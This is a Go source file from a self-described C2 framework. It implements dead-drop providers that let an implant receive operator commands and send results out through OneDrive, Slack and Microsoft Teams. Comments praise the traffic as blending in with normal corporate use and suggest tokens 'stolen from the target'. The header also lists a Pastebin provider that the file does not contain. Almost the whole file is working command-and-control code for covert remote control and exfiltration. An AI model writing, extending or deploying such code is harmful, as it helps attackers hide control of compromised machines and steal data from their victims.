package deadrop

/*
	SUDOSOC-C2 Framework
	Copyright (C) 2026  Seif

	Additional dead drop providers: OneDrive, Slack, Microsoft Teams, Pastebin.
*/

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"
)

// ─── OneDrive Provider ────────────────────────────────────────────────────

// OneDriveProvider uses a shared OneDrive file as a dead drop.
// Traffic: HTTPS to graph.microsoft.com — indistinguishable from O365 usage.
type OneDriveProvider struct {
	// AccessToken is a valid Microsoft Graph API Bearer token.
	// Can be obtained via device code flow or stolen from the target.
	AccessToken string
	// CmdItemID is the OneDrive item ID of the command file.
	CmdItemID string
	// RespItemID is the OneDrive item ID of the response file.
	RespItemID string
	client     *http.Client
	lastModified string
}

func NewOneDriveProvider(accessToken, cmdItemID, respItemID string) *OneDriveProvider {
	return &OneDriveProvider{
		AccessToken: accessToken,
		CmdItemID:   cmdItemID,
		RespItemID:  respItemID,
		client:      &http.Client{Timeout: 15 * time.Second},
	}
}

func (o *OneDriveProvider) Name() string         { return "OneDrive" }
func (o *OneDriveProvider) IsConfigured() bool   { return o.AccessToken != "" && o.CmdItemID != "" }

func (o *OneDriveProvider) ReadCommand(ctx context.Context, _ string) ([]byte, error) {
	url := "https://graph.microsoft.com/v1.0/me/drive/items/" + o.CmdItemID + "/content"
	req, _ := http.NewRequestWithContext(ctx, "GET", url, nil)
	req.Header.Set("Authorization", "Bearer "+o.AccessToken)
	if o.lastModified != "" {
		req.Header.Set("If-Modified-Since", o.lastModified)
	}

	resp, err := o.client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	if resp.StatusCode == 304 {
		return nil, nil
	}
	if resp.StatusCode != 200 {
		return nil, fmt.Errorf("OneDrive GET %d", resp.StatusCode)
	}
	o.lastModified = resp.Header.Get("Last-Modified")
	return io.ReadAll(io.LimitReader(resp.Body, 1<<20))
}

func (o *OneDriveProvider) WriteResult(ctx context.Context, _ string, result []byte) error {
	uploadURL := "https://graph.microsoft.com/v1.0/me/drive/items/" + o.RespItemID + "/content"
	req, _ := http.NewRequestWithContext(ctx, "PUT", uploadURL, bytes.NewReader(result))
	req.Header.Set("Authorization", "Bearer "+o.AccessToken)
	req.Header.Set("Content-Type", "text/plain")
	resp, err := o.client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	if resp.StatusCode != 200 && resp.StatusCode != 201 {
		return fmt.Errorf("OneDrive PUT %d", resp.StatusCode)
	}
	return nil
}

// ─── Slack Provider ───────────────────────────────────────────────────────

// SlackProvider uses a Slack channel as a dead drop.
// Traffic: HTTPS to slack.com — common corporate SaaS.
type SlackProvider struct {
	// BotToken is a Slack bot OAuth token (xoxb-...).
	BotToken string
	// CmdChannelID is the Slack channel the operator posts commands to.
	CmdChannelID string
	// RespChannelID is where the implant posts results.
	RespChannelID string
	// LastTS is the Slack timestamp of the last processed message.
	LastTS string
	client *http.Client
}

func NewSlackProvider(botToken, cmdChannelID, respChannelID string) *SlackProvider {
	return &SlackProvider{
		BotToken:      botToken,
		CmdChannelID:  cmdChannelID,
		RespChannelID: respChannelID,
		client:        &http.Client{Timeout: 15 * time.Second},
	}
}

func (s *SlackProvider) Name() string       { return "Slack" }
func (s *SlackProvider) IsConfigured() bool { return s.BotToken != "" && s.CmdChannelID != "" }

func (s *SlackProvider) ReadCommand(ctx context.Context, _ string) ([]byte, error) {
	params := url.Values{
		"channel": {s.CmdChannelID},
		"limit":   {"5"},
	}
	if s.LastTS != "" {
		params.Set("oldest", s.LastTS)
	}
	req, _ := http.NewRequestWithContext(ctx, "GET",
		"https://slack.com/api/conversations.history?"+params.Encode(), nil)
	req.Header.Set("Authorization", "Bearer "+s.BotToken)

	resp, err := s.client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
	var result struct {
		OK       bool `json:"ok"`
		Messages []struct {
			TS   string `json:"ts"`
			Text string `json:"text"`
		} `json:"messages"`
	}
	if err := json.Unmarshal(body, &result); err != nil || !result.OK {
		return nil, fmt.Errorf("Slack API error")
	}
	for _, msg := range result.Messages {
		if msg.TS > s.LastTS {
			s.LastTS = msg.TS
			// Messages starting with "C2:" are commands.
			if strings.HasPrefix(msg.Text, "C2:") {
				return []byte(strings.TrimPrefix(msg.Text, "C2:")), nil
			}
		}
	}
	return nil, nil
}

func (s *SlackProvider) WriteResult(ctx context.Context, _ string, result []byte) error {
	payload, _ := json.Marshal(map[string]string{
		"channel": s.RespChannelID,
		"text":    "R2:" + string(result),
	})
	req, _ := http.NewRequestWithContext(ctx, "POST",
		"https://slack.com/api/chat.postMessage", bytes.NewReader(payload))
	req.Header.Set("Authorization", "Bearer "+s.BotToken)
	req.Header.Set("Content-Type", "application/json")
	resp, err := s.client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	return nil
}

// ─── Microsoft Teams Provider ─────────────────────────────────────────────

// TeamsProvider uses a Microsoft Teams channel as a dead drop via Graph API.
// Traffic: HTTPS to graph.microsoft.com — legitimate M365 traffic.
type TeamsProvider struct {
	AccessToken string // Graph API Bearer token
	TeamID      string
	ChannelID   string
	client      *http.Client
	lastMsgID   string
}

func NewTeamsProvider(accessToken, teamID, channelID string) *TeamsProvider {
	return &TeamsProvider{
		AccessToken: accessToken,
		TeamID:      teamID,
		ChannelID:   channelID,
		client:      &http.Client{Timeout: 15 * time.Second},
	}
}

func (t *TeamsProvider) Name() string       { return "MicrosoftTeams" }
func (t *TeamsProvider) IsConfigured() bool { return t.AccessToken != "" && t.TeamID != "" }

func (t *TeamsProvider) ReadCommand(ctx context.Context, _ string) ([]byte, error) {
	msgURL := fmt.Sprintf(
		"https://graph.microsoft.com/v1.0/teams/%s/channels/%s/messages?$top=5",
		t.TeamID, t.ChannelID)
	req, _ := http.NewRequestWithContext(ctx, "GET", msgURL, nil)
	req.Header.Set("Authorization", "Bearer "+t.AccessToken)

	resp, err := t.client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20))

	var result struct {
		Value []struct {
			ID   string `json:"id"`
			Body struct {
				Content string `json:"content"`
			} `json:"body"`
		} `json:"value"`
	}
	if err := json.Unmarshal(body, &result); err != nil {
		return nil, err
	}
	for _, msg := range result.Value {
		if msg.ID > t.lastMsgID {
			t.lastMsgID = msg.ID
			content := msg.Body.Content
			if strings.HasPrefix(content, "C2:") {
				return []byte(strings.TrimPrefix(content, "C2:")), nil
			}
		}
	}
	return nil, nil
}

func (t *TeamsProvider) WriteResult(ctx context.Context, _ string, result []byte) error {
	payload, _ := json.Marshal(map[string]interface{}{
		"body": map[string]string{
			"content": "R2:" + string(result),
		},
	})
	msgURL := fmt.Sprintf(
		"https://graph.microsoft.com/v1.0/teams/%s/channels/%s/messages",
		t.TeamID, t.ChannelID)
	req, _ := http.NewRequestWithContext(ctx, "POST", msgURL, bytes.NewReader(payload))
	req.Header.Set("Authorization", "Bearer "+t.AccessToken)
	req.Header.Set("Content-Type", "application/json")
	resp, err := t.client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	return nil
}

// ─── Provider selector ────────────────────────────────────────────────────

// SelectProvider returns the first configured provider from the list.
// Use this to implement provider fallback:
//   providers := []Provider{teams, slack, onedrive, github}
//   active := SelectProvider(providers)
func SelectProvider(providers []Provider) Provider {
	for _, p := range providers {
		if p.IsConfigured() {
			return p
		}
	}
	return nil
}
